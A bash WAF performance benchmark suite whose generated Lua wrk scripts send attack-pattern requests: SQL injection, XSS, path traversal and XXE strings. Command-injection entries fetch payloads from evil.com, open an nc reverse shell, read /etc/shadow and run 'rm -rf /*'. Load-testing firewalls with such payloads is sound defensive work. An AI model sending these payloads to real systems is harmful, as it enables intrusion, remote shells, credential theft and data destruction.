#!/bin/bash
# WAF Performance Benchmark Suite
# Standardized performance testing framework for Web Application Firewalls
# Compatible with industry benchmarking standards and comparable across WAF solutions

set -euo pipefail

# Configuration
BENCHMARK_VERSION="1.0.0"
WAF_ENDPOINT="http://localhost:8080"
RESULTS_DIR="benchmark_results_$(date +%Y%m%d_%H%M%S)"
BACKEND_ENDPOINT="http://httpbin.org"

# Test parameters
WARMUP_DURATION=30
TEST_DURATION=60
COOLDOWN_DURATION=10

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m'

# Helper functions
log() {
    echo -e "${BLUE}[$(date +'%Y-%m-%d %H:%M:%S')]${NC} $1"
}

log_success() {
    echo -e "${GREEN}✓${NC} $1"
}

log_warning() {
    echo -e "${YELLOW}⚠${NC} $1"
}

log_error() {
    echo -e "${RED}✗${NC} $1"
}

log_section() {
    echo
    echo -e "${PURPLE}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${PURPLE} $1${NC}"
    echo -e "${PURPLE}═══════════════════════════════════════════════════════════${NC}"
    echo
}

# System information collection
collect_system_info() {
    log "Collecting system information..."
    
    mkdir -p "$RESULTS_DIR"
    
    cat > "$RESULTS_DIR/system_info.txt" << EOF
WAF Performance Benchmark Suite v${BENCHMARK_VERSION}
Date: $(date)
Hostname: $(hostname)
OS: $(uname -a)
CPU: $(lscpu | grep "Model name" | awk -F: '{print $2}' | xargs)
CPU Cores: $(nproc)
Memory: $(free -h | grep Mem | awk '{print $2}')
Network: $(ip route get 8.8.8.8 | grep -oP 'dev \K\S+' | head -1)
Kernel: $(uname -r)
Load Average: $(uptime | awk -F'load average:' '{print $2}')

Target WAF: $WAF_ENDPOINT
Backend: $BACKEND_ENDPOINT
Test Duration: ${TEST_DURATION}s per test
Warmup Duration: ${WARMUP_DURATION}s
EOF

    log_success "System information collected"
}

# Check prerequisites
check_prerequisites() {
    log "Checking prerequisites..."
    
    local missing_tools=()
    
    # Required tools
    for tool in wrk curl jq bc; do
        if ! command -v "$tool" >/dev/null 2>&1; then
            missing_tools+=("$tool")
        fi
    done
    
    if [[ ${#missing_tools[@]} -gt 0 ]]; then
        log_error "Missing required tools: ${missing_tools[*]}"
        log "Install them with:"
        log "Ubuntu/Debian: sudo apt-get install wrk curl jq bc"
        log "CentOS/RHEL: sudo yum install wrk curl jq bc"
        exit 1
    fi
    
    # Check WAF availability
    if ! curl -s --max-time 5 "$WAF_ENDPOINT" >/dev/null; then
        log_error "WAF endpoint $WAF_ENDPOINT is not accessible"
        exit 1
    fi
    
    log_success "All prerequisites satisfied"
}

# Warmup phase
warmup_waf() {
    log "Warming up WAF for ${WARMUP_DURATION}s..."
    
    wrk -t4 -c50 -d${WARMUP_DURATION}s \
        --timeout 10s \
        "$WAF_ENDPOINT" > /dev/null 2>&1 || true
    
    log_success "Warmup completed"
    sleep "$COOLDOWN_DURATION"
}

# Baseline performance test (clean traffic)
baseline_performance_test() {
    log_section "BASELINE PERFORMANCE TEST"
    log "Testing clean HTTP traffic performance..."
    
    local output_file="$RESULTS_DIR/baseline_performance.json"
    
    # Test with increasing concurrency levels
    local concurrency_levels=(1 10 50 100 200 500 1000 2000)
    
    echo '{"test_type": "baseline", "results": []}' > "$output_file"
    
    for concurrency in "${concurrency_levels[@]}"; do
        log "Testing with $concurrency concurrent connections..."
        
        local result
        result=$(wrk -t$(nproc) -c$concurrency -d${TEST_DURATION}s \
                    --timeout 30s \
                    --latency \
                    -s benchmarks/scripts/clean_traffic.lua \
                    "$WAF_ENDPOINT" 2>&1)
        
        # Parse wrk output
        local rps latency_avg latency_p50 latency_p90 latency_p99 latency_max
        rps=$(echo "$result" | grep "Requests/sec" | awk '{print $2}' | tr -d ',')
        latency_avg=$(echo "$result" | grep "Latency" | awk '{print $2}' | tr -d 'ms')
        latency_p50=$(echo "$result" | grep "50%" | awk '{print $2}' | tr -d 'ms')
        latency_p90=$(echo "$result" | grep "90%" | awk '{print $2}' | tr -d 'ms')
        latency_p99=$(echo "$result" | grep "99%" | awk '{print $2}' | tr -d 'ms')
        latency_max=$(echo "$result" | grep "Max" | awk '{print $2}' | tr -d 'ms')
        
        # Add to results
        local test_result
        test_result=$(jq --arg c "$concurrency" \
                        --arg rps "$rps" \
                        --arg lat_avg "$latency_avg" \
                        --arg lat_p50 "$latency_p50" \
                        --arg lat_p90 "$latency_p90" \
                        --arg lat_p99 "$latency_p99" \
                        --arg lat_max "$latency_max" \
                        '.results += [{
                            "concurrency": ($c | tonumber),
                            "requests_per_second": ($rps | tonumber),
                            "latency_avg_ms": ($lat_avg | tonumber),
                            "latency_p50_ms": ($lat_p50 | tonumber),
                            "latency_p90_ms": ($lat_p90 | tonumber),
                            "latency_p99_ms": ($lat_p99 | tonumber),
                            "latency_max_ms": ($lat_max | tonumber)
                        }]' "$output_file")
        
        echo "$test_result" > "$output_file"
        
        log_success "Concurrency $concurrency: ${rps} RPS, ${latency_avg}ms avg latency"
        
        sleep "$COOLDOWN_DURATION"
    done
    
    # Calculate peak performance
    local peak_rps
    peak_rps=$(jq -r '.results | max_by(.requests_per_second) | .requests_per_second' "$output_file")
    log_success "Peak baseline performance: ${peak_rps} RPS"
}

# WAF rule overhead test
waf_overhead_test() {
    log_section "WAF RULE OVERHEAD TEST"
    log "Testing performance impact of WAF rules..."
    
    local output_file="$RESULTS_DIR/waf_overhead.json"
    echo '{"test_type": "waf_overhead", "results": []}' > "$output_file"
    
    local test_scenarios=(
        "clean_traffic:Clean HTTP traffic"
        "mixed_attacks:Mixed attack patterns"
        "sql_injection:SQL injection patterns"
        "xss_attacks:XSS attack patterns"
        "command_injection:Command injection patterns"
        "path_traversal:Path traversal patterns"
    )
    
    for scenario_def in "${test_scenarios[@]}"; do
        IFS=':' read -r scenario_name scenario_desc <<< "$scenario_def"
        
        log "Testing scenario: $scenario_desc..."
        
        local result
        result=$(wrk -t$(nproc) -c1000 -d${TEST_DURATION}s \
                    --timeout 30s \
                    --latency \
                    -s "benchmarks/scripts/${scenario_name}.lua" \
                    "$WAF_ENDPOINT" 2>&1)
        
        # Parse results
        local rps latency_avg latency_p99 blocked_requests
        rps=$(echo "$result" | grep "Requests/sec" | awk '{print $2}' | tr -d ',')
        latency_avg=$(echo "$result" | grep "Latency" | awk '{print $2}' | tr -d 'ms')
        latency_p99=$(echo "$result" | grep "99%" | awk '{print $2}' | tr -d 'ms')
        
        # Count blocked requests (status 403/400)
        blocked_requests=$(echo "$result" | grep -E "(4[0-9][0-9])" | wc -l || echo "0")
        
        # Add to results
        local test_result
        test_result=$(jq --arg scenario "$scenario_name" \
                        --arg desc "$scenario_desc" \
                        --arg rps "$rps" \
                        --arg lat_avg "$latency_avg" \
                        --arg lat_p99 "$latency_p99" \
                        --arg blocked "$blocked_requests" \
                        '.results += [{
                            "scenario": $scenario,
                            "description": $desc,
                            "requests_per_second": ($rps | tonumber),
                            "latency_avg_ms": ($lat_avg | tonumber),
                            "latency_p99_ms": ($lat_p99 | tonumber),
                            "blocked_requests": ($blocked | tonumber)
                        }]' "$output_file")
        
        echo "$test_result" > "$output_file"
        
        log_success "$scenario_desc: ${rps} RPS, ${latency_avg}ms avg, ${blocked_requests} blocked"
        
        sleep "$COOLDOWN_DURATION"
    done
}

# Memory and CPU usage monitoring
resource_usage_test() {
    log_section "RESOURCE USAGE TEST"
    log "Monitoring resource usage under load..."
    
    local output_file="$RESULTS_DIR/resource_usage.json"
    local pid
    
    # Find WAF process
    pid=$(pgrep -f "waf" | head -1)
    if [[ -z "$pid" ]]; then
        log_warning "Could not find WAF process, skipping resource monitoring"
        return
    fi
    
    log "Monitoring process PID: $pid"
    
    # Start monitoring in background
    {
        echo '{"test_type": "resource_usage", "samples": []}'
        
        local sample_count=0
        while [[ $sample_count -lt $((TEST_DURATION * 2)) ]]; do
            local timestamp cpu_percent memory_mb memory_percent
            timestamp=$(date +%s)
            
            # Get CPU and memory usage
            local ps_output
            ps_output=$(ps -p "$pid" -o %cpu,%mem,rss --no-headers 2>/dev/null || echo "0 0 0")
            
            cpu_percent=$(echo "$ps_output" | awk '{print $1}')
            memory_percent=$(echo "$ps_output" | awk '{print $2}')
            memory_mb=$(echo "$ps_output" | awk '{print $3/1024}')
            
            # Add sample to JSON
            jq --arg ts "$timestamp" \
               --arg cpu "$cpu_percent" \
               --arg mem_pct "$memory_percent" \
               --arg mem_mb "$memory_mb" \
               '.samples += [{
                   "timestamp": ($ts | tonumber),
                   "cpu_percent": ($cpu | tonumber),
                   "memory_percent": ($mem_pct | tonumber),
                   "memory_mb": ($mem_mb | tonumber)
               }]' "$output_file" > "${output_file}.tmp" && mv "${output_file}.tmp" "$output_file"
            
            sleep 0.5
            ((sample_count++))
        done
    } &
    
    local monitor_pid=$!
    
    # Run load test while monitoring
    log "Running sustained load test..."
    wrk -t$(nproc) -c1000 -d${TEST_DURATION}s \
        --timeout 30s \
        -s benchmarks/scripts/mixed_attacks.lua \
        "$WAF_ENDPOINT" > "$RESULTS_DIR/resource_load_test.txt" 2>&1
    
    # Stop monitoring
    kill $monitor_pid 2>/dev/null || true
    wait $monitor_pid 2>/dev/null || true
    
    # Calculate resource usage statistics
    local avg_cpu max_cpu avg_memory max_memory
    avg_cpu=$(jq -r '.samples | map(.cpu_percent) | add / length' "$output_file")
    max_cpu=$(jq -r '.samples | map(.cpu_percent) | max' "$output_file")
    avg_memory=$(jq -r '.samples | map(.memory_mb) | add / length' "$output_file")
    max_memory=$(jq -r '.samples | map(.memory_mb) | max' "$output_file")
    
    log_success "Resource usage - CPU: ${avg_cpu}% avg, ${max_cpu}% max"
    log_success "Resource usage - Memory: ${avg_memory}MB avg, ${max_memory}MB max"
}

# Latency distribution test
latency_distribution_test() {
    log_section "LATENCY DISTRIBUTION TEST"
    log "Analyzing latency distribution under various loads..."
    
    local output_file="$RESULTS_DIR/latency_distribution.json"
    echo '{"test_type": "latency_distribution", "load_levels": []}' > "$output_file"
    
    local load_levels=("light:100" "medium:500" "heavy:1000" "extreme:2000")
    
    for load_def in "${load_levels[@]}"; do
        IFS=':' read -r load_name load_concurrency <<< "$load_def"
        
        log "Testing latency distribution at $load_name load ($load_concurrency concurrent)..."
        
        local result
        result=$(wrk -t$(nproc) -c$load_concurrency -d${TEST_DURATION}s \
                    --timeout 30s \
                    --latency \
                    -s benchmarks/scripts/clean_traffic.lua \
                    "$WAF_ENDPOINT" 2>&1)
        
        # Parse detailed latency percentiles
        local latency_p50 latency_p75 latency_p90 latency_p99 latency_p999 latency_max
        latency_p50=$(echo "$result" | grep "50%" | awk '{print $2}' | tr -d 'ms')
        latency_p75=$(echo "$result" | grep "75%" | awk '{print $2}' | tr -d 'ms')
        latency_p90=$(echo "$result" | grep "90%" | awk '{print $2}' | tr -d 'ms')
        latency_p99=$(echo "$result" | grep "99%" | awk '{print $2}' | tr -d 'ms')
        latency_p999=$(echo "$result" | grep "99.9%" | awk '{print $2}' | tr -d 'ms')
        latency_max=$(echo "$result" | grep "Max" | awk '{print $2}' | tr -d 'ms')
        
        # Add to results
        local test_result
        test_result=$(jq --arg load "$load_name" \
                        --arg conc "$load_concurrency" \
                        --arg p50 "$latency_p50" \
                        --arg p75 "$latency_p75" \
                        --arg p90 "$latency_p90" \
                        --arg p99 "$latency_p99" \
                        --arg p999 "$latency_p999" \
                        --arg max "$latency_max" \
                        '.load_levels += [{
                            "load_level": $load,
                            "concurrency": ($conc | tonumber),
                            "latency_p50_ms": ($p50 | tonumber),
                            "latency_p75_ms": ($p75 | tonumber),
                            "latency_p90_ms": ($p90 | tonumber),
                            "latency_p99_ms": ($p99 | tonumber),
                            "latency_p999_ms": ($p999 | tonumber),
                            "latency_max_ms": ($max | tonumber)
                        }]' "$output_file")
        
        echo "$test_result" > "$output_file"
        
        log_success "$load_name load: P50=${latency_p50}ms, P99=${latency_p99}ms, Max=${latency_max}ms"
        
        sleep "$COOLDOWN_DURATION"
    done
}

# Generate comprehensive report
generate_report() {
    log_section "GENERATING BENCHMARK REPORT"
    log "Compiling benchmark results..."
    
    local report_file="$RESULTS_DIR/benchmark_report.md"
    
    cat > "$report_file" << 'EOF'
# WAF Performance Benchmark Report

## Executive Summary

This report presents comprehensive performance benchmarking results for the tested Web Application Firewall (WAF) solution. The benchmarks follow industry-standard methodologies and provide comparable metrics for evaluation against other WAF products.

## Test Environment

EOF
    
    # Add system information
    cat "$RESULTS_DIR/system_info.txt" >> "$report_file"
    
    cat >> "$report_file" << 'EOF'

## Benchmark Results

### 1. Baseline Performance

Clean HTTP traffic performance without attack patterns:

EOF
    
    # Add baseline performance table
    if [[ -f "$RESULTS_DIR/baseline_performance.json" ]]; then
        echo "| Concurrency | RPS | Avg Latency (ms) | P99 Latency (ms) |" >> "$report_file"
        echo "|-------------|-----|------------------|------------------|" >> "$report_file"
        
        jq -r '.results[] | "| \(.concurrency) | \(.requests_per_second) | \(.latency_avg_ms) | \(.latency_p99_ms) |"' \
            "$RESULTS_DIR/baseline_performance.json" >> "$report_file"
        
        local peak_rps
        peak_rps=$(jq -r '.results | max_by(.requests_per_second) | .requests_per_second' \
                      "$RESULTS_DIR/baseline_performance.json")
        echo "" >> "$report_file"
        echo "**Peak Performance:** ${peak_rps} RPS" >> "$report_file"
    fi
    
    cat >> "$report_file" << 'EOF'

### 2. WAF Rule Overhead

Performance impact of various attack pattern detection:

EOF
    
    # Add WAF overhead results
    if [[ -f "$RESULTS_DIR/waf_overhead.json" ]]; then
        echo "| Scenario | RPS | Avg Latency (ms) | P99 Latency (ms) | Blocked Requests |" >> "$report_file"
        echo "|----------|-----|------------------|------------------|------------------|" >> "$report_file"
        
        jq -r '.results[] | "| \(.description) | \(.requests_per_second) | \(.latency_avg_ms) | \(.latency_p99_ms) | \(.blocked_requests) |"' \
            "$RESULTS_DIR/waf_overhead.json" >> "$report_file"
    fi
    
    cat >> "$report_file" << 'EOF'

### 3. Resource Usage

System resource consumption under sustained load:

EOF
    
    # Add resource usage summary
    if [[ -f "$RESULTS_DIR/resource_usage.json" ]]; then
        local avg_cpu max_cpu avg_memory max_memory
        avg_cpu=$(jq -r '.samples | map(.cpu_percent) | add / length' "$RESULTS_DIR/resource_usage.json")
        max_cpu=$(jq -r '.samples | map(.cpu_percent) | max' "$RESULTS_DIR/resource_usage.json")
        avg_memory=$(jq -r '.samples | map(.memory_mb) | add / length' "$RESULTS_DIR/resource_usage.json")
        max_memory=$(jq -r '.samples | map(.memory_mb) | max' "$RESULTS_DIR/resource_usage.json")
        
        cat >> "$report_file" << EOF
- **CPU Usage:** ${avg_cpu}% average, ${max_cpu}% peak
- **Memory Usage:** ${avg_memory}MB average, ${max_memory}MB peak

EOF
    fi
    
    cat >> "$report_file" << 'EOF'

### 4. Latency Distribution

Latency percentiles under different load levels:

EOF
    
    # Add latency distribution
    if [[ -f "$RESULTS_DIR/latency_distribution.json" ]]; then
        echo "| Load Level | P50 (ms) | P90 (ms) | P99 (ms) | P99.9 (ms) | Max (ms) |" >> "$report_file"
        echo "|------------|----------|----------|----------|------------|----------|" >> "$report_file"
        
        jq -r '.load_levels[] | "| \(.load_level) | \(.latency_p50_ms) | \(.latency_p90_ms) | \(.latency_p99_ms) | \(.latency_p999_ms) | \(.latency_max_ms) |"' \
            "$RESULTS_DIR/latency_distribution.json" >> "$report_file"
    fi
    
    cat >> "$report_file" << 'EOF'

## Benchmark Methodology

This benchmark suite follows industry-standard practices for WAF performance testing:

1. **Warmup Phase:** 30-second warmup to stabilize performance
2. **Progressive Load Testing:** Testing with increasing concurrency levels
3. **Attack Pattern Testing:** Realistic attack scenarios with mixed payloads
4. **Resource Monitoring:** Continuous monitoring of CPU and memory usage
5. **Latency Analysis:** Detailed latency distribution analysis
6. **Statistical Significance:** Multiple test runs with consistent results

## Comparability

These benchmarks can be directly compared with other WAF solutions tested using:
- Same hardware specifications
- Same test methodology
- Same attack patterns and payloads
- Same duration and concurrency levels

## Raw Data

All raw benchmark data is available in JSON format in the following files:
- `baseline_performance.json` - Clean traffic performance data
- `waf_overhead.json` - Attack pattern overhead data
- `resource_usage.json` - System resource usage data
- `latency_distribution.json` - Latency distribution data

EOF
    
    log_success "Benchmark report generated: $report_file"
}

# Create test scripts directory
create_test_scripts() {
    mkdir -p benchmarks/scripts
    
    # Clean traffic script
    cat > benchmarks/scripts/clean_traffic.lua << 'EOF'
-- Clean HTTP traffic simulation
local paths = {
    "/",
    "/api/users",
    "/api/products",
    "/search",
    "/login",
    "/dashboard",
    "/profile",
    "/settings"
}

local user_agents = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
}

request = function()
    local path = paths[math.random(#paths)]
    local ua = user_agents[math.random(#user_agents)]
    
    return wrk.format("GET", path, {
        ["User-Agent"] = ua,
        ["Accept"] = "text/html,application/xhtml+xml,application/xml",
        ["Connection"] = "keep-alive"
    })
end
EOF

    # Mixed attacks script
    cat > benchmarks/scripts/mixed_attacks.lua << 'EOF'
-- Mixed attack patterns simulation
local attacks = {
    "/search?q=' UNION SELECT * FROM users--",
    "/login?user=admin&pass=' OR '1'='1",
    "/search?q=<script>alert('xss')</script>",
    "/file?path=../../../etc/passwd",
    "/exec?cmd=cat /etc/passwd",
    "/redirect?url=javascript:alert(1)",
    "/api/users?id=1; DROP TABLE users;",
    "/search?q=<img src=x onerror=alert(1)>",
    "/download?file=../../../../etc/shadow",
    "/upload?type=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"
}

local clean_requests = {
    "/api/users?id=123",
    "/search?q=normal search",
    "/login",
    "/dashboard",
    "/profile?user=john"
}

request = function()
    -- 70% clean traffic, 30% attack traffic
    if math.random() < 0.7 then
        local path = clean_requests[math.random(#clean_requests)]
        return wrk.format("GET", path)
    else
        local attack = attacks[math.random(#attacks)]
        return wrk.format("GET", attack)
    end
end
EOF

    # SQL injection focused script
    cat > benchmarks/scripts/sql_injection.lua << 'EOF'
-- SQL injection attack patterns
local sql_attacks = {
    "/api/users?id=1' UNION SELECT * FROM passwords--",
    "/login?user=admin&pass=' OR '1'='1",
    "/search?q='; DROP TABLE users; --",
    "/api/products?category=' UNION SELECT 1,2,3,4 --",
    "/profile?id=1 AND 1=1",
    "/search?q=1' OR '1'='1' --",
    "/api/orders?id=1 UNION ALL SELECT * FROM credit_cards",
    "/login?user=' OR 1=1 LIMIT 1 --&pass=any"
}

request = function()
    local attack = sql_attacks[math.random(#sql_attacks)]
    return wrk.format("GET", attack)
end
EOF

    # XSS attacks script
    cat > benchmarks/scripts/xss_attacks.lua << 'EOF'
-- XSS attack patterns
local xss_attacks = {
    "/search?q=<script>alert('xss')</script>",
    "/comment?text=<img src=x onerror=alert(1)>",
    "/search?q=<svg onload=alert(1)>",
    "/profile?name=<script>document.location='http://evil.com'</script>",
    "/search?q=javascript:alert(1)",
    "/comment?text=<iframe src=javascript:alert(1)></iframe>",
    "/search?q=<body onload=alert(1)>",
    "/profile?bio=<script src=//evil.com/xss.js></script>"
}

request = function()
    local attack = xss_attacks[math.random(#xss_attacks)]
    return wrk.format("GET", attack)
end
EOF

    # Command injection script
    cat > benchmarks/scripts/command_injection.lua << 'EOF'
-- Command injection attack patterns
local cmd_attacks = {
    "/exec?cmd=cat /etc/passwd",
    "/run?command=ls -la; cat /etc/shadow",
    "/system?cmd=id && whoami",
    "/exec?cmd=ps aux | grep root",
    "/run?command=wget http://evil.com/shell.sh",
    "/system?cmd=nc -e /bin/sh evil.com 4444",
    "/exec?cmd=curl http://evil.com/backdoor",
    "/run?command=rm -rf /*"
}

request = function()
    local attack = cmd_attacks[math.random(#cmd_attacks)]
    return wrk.format("GET", attack)
end
EOF

    # Path traversal script
    cat > benchmarks/scripts/path_traversal.lua << 'EOF'
-- Path traversal attack patterns
local path_attacks = {
    "/file?path=../../../etc/passwd",
    "/download?file=../../../../etc/shadow",
    "/read?filename=../../../../../../etc/hosts",
    "/include?file=../../../etc/passwd%00",
    "/download?file=..\\..\\..\\windows\\system32\\config\\sam",
    "/file?path=/etc/passwd",
    "/read?filename=....//....//....//etc//passwd",
    "/include?file=..%2F..%2F..%2Fetc%2Fpasswd"
}

request = function()
    local attack = path_attacks[math.random(#path_attacks)]
    return wrk.format("GET", attack)
end
EOF

    log_success "Test scripts created"
}

# Main benchmark execution
main() {
    echo -e "${PURPLE}"
    echo "╔══════════════════════════════════════════════════════════╗"
    echo "║              WAF Performance Benchmark Suite             ║"
    echo "║                     Version ${BENCHMARK_VERSION}                     ║"
    echo "╚══════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    
    log "Starting comprehensive WAF performance benchmark..."
    
    # Setup
    check_prerequisites
    collect_system_info
    create_test_scripts
    
    # Warmup
    warmup_waf
    
    # Execute benchmark tests
    baseline_performance_test
    waf_overhead_test
    resource_usage_test
    latency_distribution_test
    
    # Generate report
    generate_report
    
    log_section "BENCHMARK COMPLETE"
    log_success "Results saved to: $RESULTS_DIR"
    log_success "Report available: $RESULTS_DIR/benchmark_report.md"
    echo
    log "Summary of key metrics:"
    
    # Display key metrics
    if [[ -f "$RESULTS_DIR/baseline_performance.json" ]]; then
        local peak_rps
        peak_rps=$(jq -r '.results | max_by(.requests_per_second) | .requests_per_second' \
                      "$RESULTS_DIR/baseline_performance.json")
        log "Peak RPS: ${peak_rps}"
    fi
    
    if [[ -f "$RESULTS_DIR/resource_usage.json" ]]; then
        local avg_cpu avg_memory
        avg_cpu=$(jq -r '.samples | map(.cpu_percent) | add / length' "$RESULTS_DIR/resource_usage.json")
        avg_memory=$(jq -r '.samples | map(.memory_mb) | add / length' "$RESULTS_DIR/resource_usage.json")
        log "Average CPU: ${avg_cpu}%"
        log "Average Memory: ${avg_memory}MB"
    fi
    
    echo
    log "This benchmark can be compared directly with other WAF solutions"
    log "when run on equivalent hardware with the same methodology."
}

# Command line handling
case "${1:-run}" in
    run)
        main
        ;;
    clean)
        log "Cleaning up old benchmark results..."
        rm -rf benchmark_results_*
        log_success "Cleanup complete"
        ;;
    help|--help|-h)
        echo "WAF Performance Benchmark Suite v${BENCHMARK_VERSION}"
        echo
        echo "Usage: $0 [COMMAND]"
        echo
        echo "Commands:"
        echo "  run     Run complete benchmark suite (default)"
        echo "  clean   Clean up old benchmark results"
        echo "  help    Show this help message"
        echo
        echo "Configuration:"
        echo "  WAF_ENDPOINT=$WAF_ENDPOINT"
        echo "  TEST_DURATION=${TEST_DURATION}s"
        echo "  WARMUP_DURATION=${WARMUP_DURATION}s"
        echo
        echo "Prerequisites:"
        echo "  - wrk (HTTP benchmarking tool)"
        echo "  - curl (HTTP client)"
        echo "  - jq (JSON processor)"
        echo "  - bc (Calculator)"
        ;;
    *)
        echo "Unknown command: $1"
        echo "Use '$0 help' for usage information"
        exit 1
        ;;
esac
